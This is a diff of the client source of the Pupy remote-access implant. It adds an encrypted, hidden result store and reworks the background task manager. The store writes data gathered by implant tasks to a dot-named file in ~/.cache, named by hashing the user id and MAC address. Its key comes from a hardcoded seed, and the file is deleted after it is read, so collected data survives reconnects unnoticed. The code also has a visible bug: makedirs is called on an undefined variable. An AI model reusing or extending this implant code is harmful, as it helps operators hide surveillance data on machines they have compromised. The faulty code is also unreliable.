@@ -60,12 +60,20 @@ from network import conf
 from network.lib.base_launcher import LauncherError
 from network.lib.connection import PupyConnection
 from network.lib.streams.PupySocketStream import PupyChannel
-from network.lib.transports.cryptoutils.aes import NewAESCipher as AES
 import logging
 import shlex
 import marshal
 import zlib
 import signal
+
+import cPickle
+
+import hashlib
+import uuid
+from network.lib.transports.cryptoutils.aes import \
+     NewAESCipher as AES, \
+     append_PKCS7_padding as pad, \
+     strip_PKCS7_padding as unpad
 
 try:
     # additional imports needed to package with pyinstaller
@@ -93,6 +101,274 @@ except ImportError, e:
 
 pupy.infos = {}  # global dictionary to store informations persistent through a deconnection
 pupy.namespace = None
+
+def print_exception(tag=''):
+    global debug
+
+    remote_print_error = None
+    dprint = None
+
+    try:
+        import pupyimporter
+        remote_print_error = pupyimporter.remote_print_error
+        dprint = pupyimporter.dprint
+    except:
+        pass
+
+    import traceback
+    trace = str(traceback.format_exc())
+    error = ' '.join([ x for x in (
+        tag, 'Exception:', trace
+    ) if x ])
+
+    if remote_print_error:
+        try:
+            remote_print_error(error)
+        except Exception, e:
+            pass
+    elif dprint:
+        dprint(error)
+    elif debug:
+        try:
+            logging.error(error)
+        except:
+            print error
+
+class PStore(object):
+    def __new__(cls, *args, **kw):
+        if not hasattr(cls, '_instance'):
+            orig = super(PStore, cls)
+            cls._instance = orig.__new__(cls, *args, **kw)
+
+        return cls._instance
+
+    def __init__(self, pstore_dir='~'):
+        seed = '{}:{}'.format(os.getuid(), uuid.getnode())
+
+        h = hashlib.sha1()
+        h.update(seed)
+
+        if os.name == 'posix':
+            if pstore_dir == '~':
+                pstore_dir = os.path.join(pstore_dir, '.cache')
+            pstore_name = '.{}'.format(h.hexdigest())
+        else:
+            if pstore_dir == '~':
+                pstore_dir = os.path.join(pstore_dir, 'AppLocal')
+            pstore_name = h.hexdigest()
+
+        self._pstore_path = os.path.expanduser(
+            os.path.join(pstore_dir, pstore_name)
+        )
+
+        h = hashlib.sha1()
+        h.update('password' + seed)
+
+        self._pstore_key = (h.digest()[:16], '\x00'*16)
+        self._pstore = {}
+
+        self.load()
+
+    def __getitem__(self, key):
+        if issubclass(type(key), object):
+            key = type(key).__name__
+        return self._pstore.get(key)
+
+    def __setitem__(self, key, value):
+        if issubclass(type(key), object):
+            key = type(key).__name__
+        self._pstore[key] = value
+
+    def load(self):
+        if not os.path.exists(self._pstore_path):
+            return
+
+        data = None
+        try:
+            with open(self._pstore_path) as pstore:
+                data = pstore.read()
+
+            try:
+                os.unlink(self._pstore_path)
+            except:
+                print_exception('PS/L')
+
+            if not data:
+                return
+
+            data = AES(*self._pstore_key).decrypt(data)
+            data = unpad(data)
+            data = cPickle.loads(data)
+        except:
+            print_exception('[PS/L]')
+            return
+
+        if type(data) == dict:
+            self._pstore.update(data)
+
+    def store(self):
+        if not self._pstore:
+            return
+
+        pstore_dir = os.path.dirname(self._pstore_path)
+        try:
+            if not os.path.isdir(pstore_dir):
+                os.makedirs(pstore_dirs)
+
+            with open(self._pstore_path, 'w+') as pstore:
+                data = cPickle.dumps(self._pstore)
+                data = pad(data)
+                data = AES(*self._pstore_key).encrypt(data)
+                pstore.write(data)
+
+        except:
+            print_exception('[PS/S]')
+            return
+
+
+class Task(threading.Thread):
+    stopped = None
+    results_type = list
+
+    def __init__(self, manager, *args, **kwargs):
+        threading.Thread.__init__(self)
+        self.daemon = True
+        self._pstore = manager.pstore
+        self._stopped = threading.Event()
+        if not self._pstore[self]:
+            self._pstore[self] = self.results_type()
+        self._manager = manager
+        self._dirty = False
+
+    @property
+    def name(self):
+        return type(self).__name__
+
+    @property
+    def results(self):
+        results = self._pstore[self]
+        self._pstore[self] = self.results_type()
+        self._dirty = False
+        return results
+
+    @property
+    def dirty(self):
+        return self._dirty
+
+    def append(self, result):
+        if self.results_type in (str, unicode):
+            self._pstore[self] += result
+        elif self.results_type == list:
+            self._pstore[self].append(result)
+        elif self.results_type == set:
+            self._pstore[self].add(result)
+        else:
+            raise TypeError('Unknown results type: {}'.format(self.results_type))
+        self._dirty = True
+
+    def stop(self):
+        if self._stopped and self.active:
+            self._stopped.set()
+
+    def run(self):
+        try:
+            self.task()
+        except:
+            print_exception('[T/R:{}]'.format(self.name))
+            if self._stopped:
+                self._stopped.set()
+
+    @property
+    def active(self):
+        if not self._stopped:
+            return False
+
+        try:
+            return not self._stopped.is_set()
+
+        except:
+            print_exception('[T/A:{}]'.format(self.name))
+
+    def event(self, event):
+        pass
+
+class Manager(object):
+    TERMINATE = 0
+    PAUSE = 1
+    SESSION = 2
+
+    def __new__(cls, *args, **kw):
+        if not hasattr(cls, '_instance'):
+            orig = super(Manager, cls)
+            cls._instance = orig.__new__(cls, *args, **kw)
+
+        return cls._instance
+
+    def __init__(self, pstore):
+        self.tasks = {}
+        self.pstore = pstore
+
+    def get(self, klass):
+        name = klass.__name__
+        return self.tasks.get(name)
+
+    def create(self, klass, *args, **kwargs):
+        name = klass.__name__
+        if not name in self.tasks:
+            try:
+                task = klass(self, *args, **kwargs)
+                task.start()
+                self.tasks[name] = task
+                return task
+
+            except:
+                print_exception('[M/C:{}]'.format(name))
+
+    def stop(self, klass, force=False):
+        name = klass.__name__
+        if name in self.tasks:
+            try:
+                self.tasks[name].stop()
+                del self.tasks[name]
+            except:
+                print_exception('[M/S:{}]'.format(name))
+                if force:
+                    del self.tasks[name]
+
+    def active(self, klass=None):
+        name = klass.__name__
+        if name in self.tasks:
+            return self.tasks[name].stopped.is_set()
+        else:
+            return False
+
+    @property
+    def status(self):
+        return {
+            name:{
+                'active': task.active,
+                'results': task.dirty,
+            } for name,task in self.tasks.iteritems()
+        }
+
+    def event(self, event):
+        for task in self.tasks.itervalues():
+            try:
+                task.event(event)
+            except:
+                print_exception('[M/E:{}:{}]'.format(task.name, event))
+
+        if event == self.TERMINATE:
+            for task in self.tasks.itervalues():
+                try:
+                    task.stop()
+                except:
+                    print_exception('[M/E:{}:{}]'.format(task.name, event))
+
+            self.pstore.store()
+
+setattr(pupy, 'manager', Manager(PStore()))
+setattr(pupy, 'Task', Task)
 
 def safe_obtain(proxy):
     """ safe version of rpyc's rpyc.utils.classic.obtain, without using pickle. """
@@ -130,154 +406,6 @@ REVERSE_SLAVE_CONF = dict(
     instantiate_custom_exceptions=True,
     instantiate_oldstyle_exceptions=True,
 )
-
-def print_exception(tag=''):
-    global debug
-
-    remote_print_error = None
-    dprint = None
-    try:
-        import pupyimporter
-        remote_print_error = pupyimporter.remote_print_error
-        dprint = pupyimporter.dprint
-    except:
-        pass
-
-    import traceback
-    trace = str(traceback.format_exc())
-    error = ' '.join([ x for x in (
-        tag, 'Exception:', trace
-    ) if x ])
-    print "// DEBUG: {}".format(error)
-    if remote_print_error:
-        try:
-            remote_print_error(error)
-        except Exception, e:
-            print "Exception during remote printing: ", e
-            pass
-        else:
-            if dprint:
-                dprint(error)
-            elif debug:
-                try:
-                    logging.error(error)
-                except:
-                    print error
-
-
-class Task(threading.Thread):
-    stopped = None
-    results_type = list
-
-    def __init__(self, *args, **kwargs):
-        threading.Thread.__init__(self)
-        self.daemon = True
-        self.stopped = threading.Event()
-        self._results = self.results_type()
-
-    @property
-    def name(self):
-        return type(self).__name__
-
-    @property
-    def results(self):
-        results = self._results
-        self._results = self.results_type()
-        return results
-
-    def append(self, result):
-        if self.results_type in (str, unicode):
-            self._results += result
-        elif self.results_type == list:
-            self._results.append(result)
-        elif self.results_type == set:
-            self._results.add(result)
-        else:
-            raise TypeError('Unknown results type: {}'.format(self.results_type))
-
-    def stop(self):
-        if self.stopped and self.active:
-            self.stopped.set()
-
-    def run(self):
-        try:
-            self.task()
-        except:
-            print_exception('[T/R:{}]'.format(self.name))
-            if self.stopped:
-                self.stopped.set()
-
-    @property
-    def active(self):
-        if not self.stopped:
-            return False
-
-        try:
-            return not self.stopped.is_set()
-        except:
-            print_exception('[T/A:{}]'.format(self.name))
-
-    def event(self, event):
-        pass
-
-class Manager(object):
-    TERMINATE = 0
-    PAUSE = 1
-    SESSION = 2
-
-    def __new__(cls, *args, **kw):
-        if not hasattr(cls, '_instance'):
-            orig = super(Manager, cls)
-            cls._instance = orig.__new__(cls, *args, **kw)
-
-        return cls._instance
-
-    def __init__(self):
-        self.tasks = {}
-
-    def get(self, klass):
-        name = klass.__name__
-        return self.tasks.get(name)
-
-    def create(self, klass, *args, **kwargs):
-        name = klass.__name__
-        if not name in self.tasks:
-            try:
-                task = klass(*args, **kwargs)
-                task.start()
-                self.tasks[name] = task
-                return task
-
-            except:
-                print_exception('[M/C:{}]'.format(name))
-
-    def stop(self, klass, force=False):
-        name = klass.__name__
-        if name in self.tasks:
-            try:
-                self.tasks[name].stop()
-                del self.tasks[name]
-            except:
-                print_exception('[M/S:{}]'.format(name))
-                if force:
-                    del self.tasks[name]
-
-    def active(self, klass):
-        name = klass.__name__
-        if name in self.tasks:
-            return self.tasks[name].stopped.is_set()
-        else:
-            return False
-
-    def event(self, event):
-        for task in self.tasks.itervalues():
-            try:
-                task.event(event)
-            except:
-                print_exception('[M/E:{}:{}]'.format(task.name, event))
-
-setattr(pupy, 'manager', Manager())
-setattr(pupy, 'Task', Task)
 
 class UpdatableModuleNamespace(ModuleNamespace):
     __slots__ = ['__invalidate__']
@@ -439,10 +567,13 @@ def handle_sighup(*args):
 
 def handle_sigterm(*args):
     try:
-        manager = Manager()
-        manager.event(manager.TERMINATE)
+        if hasattr(pupy, 'manager'):
+            pupy.manager.event(Manager.TERMINATE)
+
     except:
         print_exception('[ST]')
+
+    os._exit(0)
 
 attempt = 0
 
